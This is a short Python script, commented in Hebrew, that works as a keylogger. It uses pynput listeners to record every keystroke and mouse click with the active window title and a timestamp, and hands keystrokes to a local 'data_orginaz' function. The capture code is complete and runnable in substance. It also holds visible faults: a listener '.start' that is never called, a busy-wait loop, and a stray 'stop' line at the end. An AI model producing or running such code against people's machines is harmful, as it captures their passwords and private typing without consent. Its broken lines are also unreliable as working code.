
# python
from pynput import mouse, keyboard
from datetime import datetime
import threading
import pygetwindow as gw
from functions.data_org import data_orginaz
from functions.data_org import moath_cklick

# פונקציה לרישום זמן ולחיצה בעכבר
def on_click(x, y, button, pressed):
    if pressed:
        try:
            active_window = gw.getActiveWindow()
            window_title = active_window.title if active_window else "Unknown"
        except Exception:
            window_title = "Unknown"
        moath_cklick()
        print(f"[{datetime.now()}] Click at ({x}, {y}) in window: {window_title}")

mouse.Listener(on_click=on_click).start
# פונקציה לרישום מקשים
def on_press(key):
    try:
        active_window = gw.getActiveWindow()
        window_title = active_window.title if active_window else "Unknown"
    except Exception:
        window_title = "Unknown"
    try:
        data_orginaz(window_title, datetime.now(), key.char)
        print(f"[{datetime.now()}] Key pressed: {key.char}  in window: {window_title}")
    except AttributeError:
        print(f"[{datetime.now()}] Special key pressed: {key} in window: {window_title}")

# מאזינים לעכבר ולמקלדת
mouse_listener = mouse.Listener(on_click=on_click)
keyboard_listener = keyboard.Listener(on_press=on_press)

# הרצה ברקע
mouse_listener.start()
keyboard_listener.start()

# השארת התוכנית רצה
try:
    while True:
        pass
except KeyboardInterrupt:
    mouse_listener.stop()
    keyboard_listener.stop()

stop
